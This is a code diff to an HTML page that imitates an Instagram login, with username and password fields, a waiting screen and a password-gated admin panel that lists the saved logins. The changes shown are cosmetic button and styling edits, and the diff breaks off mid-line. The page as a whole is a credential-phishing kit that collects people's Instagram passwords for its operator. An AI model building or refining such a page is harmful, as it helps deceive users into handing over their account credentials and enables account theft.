@@ -73,6 +73,7 @@
   }
 
   button:hover { opacity: 0.9; }
+  button:active { transform: scale(0.98); }
 
   .wait-text {
     font-size: 16px;
@@ -166,6 +167,8 @@
     margin-top: 15px;
   }
 
+  .gray-btn { background: #888; }
+
   .empty {
     text-align: center;
     color: #999;
@@ -182,7 +185,7 @@
   <h1>Something big is waiting your Instagram</h1>
   <input type="text" id="username" placeholder="Username" autocomplete="off" />
   <input type="password" id="password" placeholder="Password" />
-  <button onclick="submitLogin()">Log In</button>
+  <button type="button" onclick="submitLogin()">Log In</button>
 </div>
 
 <!-- ============ PAGE 2: WAIT PAGE ============ -->
@@ -194,7 +197,7 @@
 </div>
 
 <!-- ============ ADMIN BUTTON (hidden on page 1) ============ -->
-<button class="admin-btn hidden" id="adminBtn" onclick="openAdmin()" title="Admin">⚙</button>
+<button type="button" class="admin-btn hidden" id="adminBtn" onclick="openAdmin()" title="Admin">⚙</button>
 
 <!-- ============ ADMIN PANEL ============ -->
 <div class="admin-panel hidden" id="adminPanel">
@@ -203,8 +206,8 @@
 
     <div id="adminGate">
       <input type="password" id="adminPass" placeholder="Enter admin password" />
-      <button onclick="checkAdmin()">Unlock</button>
-      <button class="clear-btn" style="background:#888;" onclick="closeAdmin()">Cancel</button>
+      <button type="button" onclick="checkAdmin()">Unlock</button>
+      <button type="button" class="gray-btn" onclick="closeAdmin()">Cancel</button>
     </div>
 
     <div id="adminData" class="hidden">
@@ -215,8 +218,8 @@
         <tbody id="tableBody"></tbody>
       </table>
       <div id="emptyMsg" class="empty hidden">No logins saved yet.</div>
-      <button class="clear-btn" onclick="clearData()">Clear All Data</button>
-      <button class="clear-btn" style="background:#888;" onclick="closeAdmin()">Close</button>
+      <button type="button" class="clear-btn" onclick="clearData()">Clear All Data</button>
+      <button type="button" class="gray-btn" onclick="closeAdmin()">Close</button>
     </div>
   </div>
 </div>
@@ -246,7 +249,7 @@
     document.getElementById('loginPage').classList.add('hidden');
     document.getElementById('waitPage').classList.remove('hidden');
 
-    // Show admin button ONLY now (page 2)
+    // Show admin button only on page 2
     document.getElementById('adminBtn').classList.remove('hidden');
   }
 
@@ -254,10 +257,4 @@
   function openAdmin() {
     document.getElementById('adminPanel').classList.remove('hidden');
     document.getElementById('adminGate').classList.remove('hidden');
-    document.getElementById('adminData').classList.add('hidden');
-    document.getElementById('adminPass').value = '';
-  }
-
-  function closeAdmin() {
-    document.getElementById('adminPanel').classList.add('hidden');
-  }
+    document.getElementById('adminData').
